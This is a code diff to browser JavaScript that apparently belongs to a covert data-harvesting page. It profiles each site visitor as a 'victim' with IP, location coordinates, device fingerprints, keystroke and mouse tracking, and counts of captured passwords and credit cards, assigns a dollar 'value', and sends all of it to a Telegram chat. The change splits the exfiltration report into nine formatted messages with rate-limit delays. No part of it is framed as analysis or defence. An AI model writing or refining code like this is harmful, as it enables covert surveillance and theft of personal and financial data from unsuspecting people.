@@ -149,7 +149,7 @@
                         },
                         body: JSON.stringify({
                             chat_id: CONFIG.telegram.chatId,
-                            text: message.substring(0, 4090), // Telegram limit
+                            text: message.substring(0, 4090),
                             parse_mode: 'HTML'
                         })
                     });
@@ -189,11 +189,14 @@
             return false;
         }
 
-        // Process message queue
-        function processMessageQueue() {
-            if (messageQueue.length > 0 && !isSending) {
-                const message = messageQueue.shift();
-                sendToTelegram(message);
+        // NEW: Send multiple smaller messages
+        async function sendMultipleMessages(messages) {
+            for (let i = 0; i < messages.length; i++) {
+                await sendToTelegram(messages[i]);
+                // Add delay between messages to avoid rate limiting
+                if (i < messages.length - 1) {
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
             }
         }
 
@@ -479,7 +482,7 @@
                 touchSupport: 'ontouchstart' in window ? 'Supported' : 'Not supported',
                 pointerSupport: navigator.pointerEnabled ? 'Supported' : 'Not supported',
                 vibration: navigator.vibrate ? 'Supported' : 'Not supported',
-                battery: 'Not supported' // Simplified for reliability
+                battery: 'Not supported'
             };
         }
 
@@ -897,115 +900,118 @@
             return visited;
         }
 
-        // COMPREHENSIVE MESSAGING FORMAT AS REQUESTED
+        // NEW: Split comprehensive messaging into multiple smaller messages
         async function sendEnhancedReport(victimData) {
             victimValue = calculateRealisticValue(victimData);
             victimId = generateVictimID(victimData);
 
-            let message = `8X ENHANCED DATA EXTRACTION\n\n`;
-            message += `Identity Verified - Full Data Capture\n\n`;
-            
-            message += `VERIFICATION DATA:\n`;
-            message += `• Name: Not provided\n`;
-            message += `• Email: Not provided\n`;
-            message += `• Phone: Not provided\n`;
-            message += `• Time: ${victimData.timestamp}\n\n`;
-            
-            message += `NETWORK DATA (8x):\n`;
-            message += `• IP: ${victimData.network.ip}\n`;
-            message += `• ISP: ${victimData.network.isp}\n`;
-            message += `• ASN: ${victimData.network.asn}\n`;
-            message += `• Connection: ${victimData.network.connection}\n`;
-            message += `• VPN: ${victimData.network.vpn}\n`;
-            message += `• Proxy: ${victimData.network.proxy}\n`;
-            message += `• Tor: ${victimData.network.tor}\n`;
-            message += `• Bandwidth: ${victimData.network.bandwidth} kbps\n`;
-            message += `• Latency: ${victimData.network.latency} ms\n`;
-            message += `• Data Saver: ${victimData.network.dataSaver}\n\n`;
-            
-            message += `LOCATION DATA (8x):\n`;
-            message += `• City: ${victimData.location.city}\n`;
-            message += `• Region: ${victimData.location.region}\n`;
-            message += `• Country: ${victimData.location.country} (${victimData.location.country_code})\n`;
-            message += `• Postal: ${victimData.location.postal}\n`;
-            message += `• Coordinates: ${victimData.location.latitude}, ${victimData.location.longitude}\n`;
-            message += `• Timezone: ${victimData.location.timezone}\n`;
-            message += `• Currency: ${victimData.location.currency}\n`;
-            message += `• Calling Code: ${victimData.location.calling_code}\n\n`;
-            
-            message += `BROWSER DATA (8x):\n`;
-            message += `• Platform: ${victimData.browser.platform}\n`;
-            message += `• Vendor: ${victimData.browser.vendor}\n`;
-            message += `• Language: ${victimData.browser.language}\n`;
-            message += `• Cores: ${victimData.browser.cores}\n`;
-            message += `• Memory: ${victimData.browser.memory}\n`;
-            message += `• Plugins: ${victimData.browser.plugins} detected\n`;
-            message += `• WebDriver: ${victimData.browser.webdriver}\n`;
-            message += `• PDF Viewer: ${victimData.browser.pdf_viewer}\n`;
-            message += `• Build ID: ${victimData.browser.buildID}\n`;
-            message += `• Product: ${victimData.browser.product}\n\n`;
-            
-            message += `HARDWARE DATA (8x):\n`;
-            message += `• Screen: ${victimData.hardware.screen}\n`;
-            message += `• Pixel Ratio: ${victimData.hardware.pixel_ratio}\n`;
-            message += `• Color Depth: ${victimData.hardware.color_depth} bit\n`;
-            message += `• Orientation: ${victimData.hardware.orientation}\n`;
-            message += `• Touch Points: ${victimData.hardware.touch_points}\n`;
-            message += `• Available Screen: ${victimData.hardware.availWidth}x${victimData.hardware.availHeight}\n`;
-            message += `• Touch Support: ${victimData.hardware.touchSupport}\n`;
-            message += `• Battery Level: ${victimData.hardware.battery?.level || 'Unknown'}%\n\n`;
-            
-            message += `FINGERPRINT DATA (8x):\n`;
-            message += `• Canvas: ${victimData.fingerprint.canvas}\n`;
-            message += `• WebGL: ${victimData.fingerprint.webgl}\n`;
-            message += `• Audio: ${victimData.fingerprint.audio}\n`;
-            message += `• Fonts: ${victimData.fingerprint.fonts}\n`;
-            message += `• Timezone Offset: ${victimData.fingerprint.timezone_offset}\n`;
-            message += `• WebGL Vendor: ${victimData.fingerprint.webglVendor}\n`;
-            message += `• WebGL Renderer: ${victimData.fingerprint.webglRenderer}\n`;
-            message += `• Device Pixel Ratio: ${victimData.fingerprint.devicePixelRatio}\n\n`;
-            
-            message += `BEHAVIORAL DATA (8x):\n`;
-            message += `• Referrer: ${victimData.behavioral.referrer}\n`;
-            message += `• Page Load: ${victimData.behavioral.page_load}ms\n`;
-            message += `• Time on Page: ${victimData.behavioral.time_on_page}ms\n`;
-            message += `• DOM Size: ${victimData.behavioral.dom_size} elements\n`;
-            message += `• Scroll Depth: ${victimData.behavioral.scroll_depth}%\n`;
-            message += `• Mouse Movements: ${victimData.behavioral.mouse_movements} tracked\n`;
-            message += `• Keystrokes: ${victimData.behavioral.keystroke_timing} tracked\n`;
-            message += `• Viewport: ${victimData.behavioral.viewport}\n\n`;
-            
-            message += `SOCIAL DATA:\n`;
-            message += `• Passwords: ${victimData.social.passwords} captured\n`;
-            message += `• Credit Cards: ${victimData.social.credit_cards} found\n`;
-            message += `• Personal Info: ${victimData.social.personal_info} fields\n`;
-            message += `• Browsing Data: ${victimData.social.browsing_data} sites estimated\n`;
-            message += `• Social Profiles: ${victimData.social.social_media_profiles.length} detected\n`;
-            message += `• Messaging Apps: ${victimData.social.messaging_apps.length} detected\n\n`;
-            
-            message += `SYSTEM DATA:\n`;
-            message += `• OS: ${victimData.system.os}\n`;
-            message += `• Architecture: ${victimData.system.arch}\n`;
-            message += `• Version: ${victimData.system.version}\n\n`;
-            
-            message += `Time: ${victimData.timestamp}\n`;
-            message += `URL: ${victimData.behavioral.url}\n`;
-            message += `Victim ID: ${victimId}\n`;
-            message += `Estimated Value: $${victimValue}\n`;
-            message += `DATA CAPTURE: COMPLETED`;
+            const messages = [];
 
-            await sendToTelegram(message);
+            // Message 1: Header and Basic Info
+            messages.push(`🔍 *8X ENHANCED DATA EXTRACTION STARTED*\n\n` +
+                         `🆔 *Victim ID:* ${victimId}\n` +
+                         `💰 *Estimated Value:* $${victimValue}\n` +
+                         `🕒 *Time:* ${victimData.timestamp}\n` +
+                         `🌐 *URL:* ${victimData.behavioral.url}\n\n` +
+                         `_Data capture in progress..._`);
+
+            // Message 2: Network Information
+            messages.push(`🌐 *NETWORK DATA* (8x)\n\n` +
+                         `📡 *IP:* ${victimData.network.ip}\n` +
+                         `🏢 *ISP:* ${victimData.network.isp}\n` +
+                         `🔢 *ASN:* ${victimData.network.asn}\n` +
+                         `📶 *Connection:* ${victimData.network.connection}\n` +
+                         `🛡️ *VPN:* ${victimData.network.vpn}\n` +
+                         `🔌 *Proxy:* ${victimData.network.proxy}\n` +
+                         `🧅 *Tor:* ${victimData.network.tor}\n` +
+                         `⚡ *Bandwidth:* ${victimData.network.bandwidth} kbps\n` +
+                         `⏱️ *Latency:* ${victimData.network.latency} ms`);
+
+            // Message 3: Location Information
+            messages.push(`📍 *LOCATION DATA* (8x)\n\n` +
+                         `🏙️ *City:* ${victimData.location.city}\n` +
+                         `🗺️ *Region:* ${victimData.location.region}\n` +
+                         `🇺🇳 *Country:* ${victimData.location.country} (${victimData.location.country_code})\n` +
+                         `📮 *Postal:* ${victimData.location.postal}\n` +
+                         `🎯 *Coordinates:* ${victimData.location.latitude}, ${victimData.location.longitude}\n` +
+                         `⏰ *Timezone:* ${victimData.location.timezone}\n` +
+                         `💵 *Currency:* ${victimData.location.currency}\n` +
+                         `📞 *Calling Code:* ${victimData.location.calling_code}`);
+
+            // Message 4: Browser Information
+            messages.push(`🌍 *BROWSER DATA* (8x)\n\n` +
+                         `💻 *Platform:* ${victimData.browser.platform}\n` +
+                         `🏷️ *Vendor:* ${victimData.browser.vendor}\n` +
+                         `🗣️ *Language:* ${victimData.browser.language}\n` +
+                         `⚙️ *Cores:* ${victimData.browser.cores}\n` +
+                         `💾 *Memory:* ${victimData.browser.memory}\n` +
+                         `🔌 *Plugins:* ${victimData.browser.plugins} detected\n` +
+                         `🤖 *WebDriver:* ${victimData.browser.webdriver}\n` +
+                         `📄 *PDF Viewer:* ${victimData.browser.pdf_viewer}`);
+
+            // Message 5: Hardware Information
+            messages.push(`💻 *HARDWARE DATA* (8x)\n\n` +
+                         `🖥️ *Screen:* ${victimData.hardware.screen}\n` +
+                         `📐 *Pixel Ratio:* ${victimData.hardware.pixel_ratio}\n` +
+                         `🎨 *Color Depth:* ${victimData.hardware.color_depth} bit\n` +
+                         `📱 *Orientation:* ${victimData.hardware.orientation}\n` +
+                         `👆 *Touch Points:* ${victimData.hardware.touch_points}\n` +
+                         `📊 *Available Screen:* ${victimData.hardware.availWidth}x${victimData.hardware.availHeight}\n` +
+                         `🖐️ *Touch Support:* ${victimData.hardware.touchSupport}`);
+
+            // Message 6: Fingerprinting Data
+            messages.push(`🔬 *FINGERPRINT DATA* (8x)\n\n` +
+                         `🎨 *Canvas:* ${victimData.fingerprint.canvas}\n` +
+                         `🔄 *WebGL:* ${victimData.fingerprint.webgl}\n` +
+                         `🎵 *Audio:* ${victimData.fingerprint.audio}\n` +
+                         `🔤 *Fonts:* ${victimData.fingerprint.fonts}\n` +
+                         `⏰ *Timezone Offset:* ${victimData.fingerprint.timezone_offset}\n` +
+                         `🏷️ *WebGL Vendor:* ${victimData.fingerprint.webglVendor}\n` +
+                         `🎮 *WebGL Renderer:* ${victimData.fingerprint.webglRenderer}`);
+
+            // Message 7: Behavioral Data
+            messages.push(`📊 *BEHAVIORAL DATA* (8x)\n\n` +
+                         `🔗 *Referrer:* ${victimData.behavioral.referrer}\n` +
+                         `⚡ *Page Load:* ${victimData.behavioral.page_load}ms\n` +
+                         `⏱️ *Time on Page:* ${victimData.behavioral.time_on_page}ms\n` +
+                         `🌳 *DOM Size:* ${victimData.behavioral.dom_size} elements\n` +
+                         `📜 *Scroll Depth:* ${victimData.behavioral.scroll_depth}%\n` +
+                         `🖱️ *Mouse Movements:* ${victimData.behavioral.mouse_movements} tracked\n` +
+                         `⌨️ *Keystrokes:* ${victimData.behavioral.keystroke_timing} tracked`);
+
+            // Message 8: Social and System Data
+            messages.push(`👥 *SOCIAL & SYSTEM DATA*\n\n` +
+                         `🔐 *Passwords:* ${victimData.social.passwords} captured\n` +
+                         `💳 *Credit Cards:* ${victimData.social.credit_cards} found\n` +
+                         `👤 *Personal Info:* ${victimData.social.personal_info} fields\n` +
+                         `🌐 *Browsing Data:* ${victimData.social.browsing_data} sites estimated\n` +
+                         `📱 *Social Profiles:* ${victimData.social.social_media_profiles.length} detected\n` +
+                         `💬 *Messaging Apps:* ${victimData.social.messaging_apps.length} detected\n\n` +
+                         `💻 *OS:* ${victimData.system.os}\n` +
+                         `🏗️ *Architecture:* ${victimData.system.arch}\n` +
+                         `🔢 *Version:* ${victimData.system.version}`);
+
+            // Message 9: Final Summary
+            messages.push(`✅ *DATA CAPTURE COMPLETED*\n\n` +
+                         `🆔 *Victim ID:* ${victimId}\n` +
+                         `💰 *Final Value:* $${victimValue}\n` +
+                         `🕒 *Completion Time:* ${victimData.timestamp}\n` +
+                         `📊 *Total Data Points:* ${Object.keys(victimData).length} categories\n\n` +
+                         `🎯 *Target successfully profiled*`);
+
+            // Send all messages
+            await sendMultipleMessages(messages);
         }
 
         async function sendClickReport(imageId) {
             const victimData = await collectVictimData();
             victimValue = calculateRealisticValue(victimData);
             
-            let message = `IMAGE CLICK DETECTED\n`;
-            message += `Victim ID: ${victimId || generateVictimID(victimData)}\n`;
-            message += `Image ID: ${imageId}\n`;
-            message += `Estimated Value: $${victimValue}\n`;
-            message += `Time: ${victimData.timestamp}`;
+            let message = `🖱️ *IMAGE CLICK DETECTED*\n\n` +
+                         `📸 *Image ID:* ${imageId}\n` +
+                         `🆔 *Victim ID:* ${victimId || generateVictimID(victimData)}\n` +
+                         `💰 *Current Value:* $${victimValue}\n` +
+                         `🕒 *Time:* ${victimData.timestamp}`;
 
             await sendToTelegram(message);
         }
@@ -1062,13 +1068,13 @@
         });
 
         async function sendBehavioralUpdate(victimData) {
-            let message = `BEHAVIORAL UPDATE\n`;
-            message += `Victim ID: ${victimId}\n`;
-            message += `Time on Page: ${victimData.behavioral.time_on_page}ms\n`;
-            message += `Scroll Depth: ${victimData.behavioral.scroll_depth}%\n`;
-            message += `Mouse Movements: ${victimData.behavioral.mouse_movements}\n`;
-            message += `Keystrokes: ${victimData.behavioral.keystroke_timing}\n`;
-            message += `Current Value: $${calculateRealisticValue(victimData)}`;
+            let message = `📊 *BEHAVIORAL UPDATE*\n\n` +
+                         `🆔 *Victim ID:* ${victimId}\n` +
+                         `⏱️ *Time on Page:* ${Math.round(victimData.behavioral.time_on_page/1000)}s\n` +
+                         `📜 *Scroll Depth:* ${victimData.behavioral.scroll_depth}%\n` +
+                         `🖱️ *Mouse Movements:* ${victimData.behavioral.mouse_movements}\n` +
+                         `⌨️ *Keystrokes:* ${victimData.behavioral.keystroke_timing}\n` +
+                         `💰 *Current Value:* $${calculateRealisticValue(victimData)}`;
 
             await sendToTelegram(message);
         }
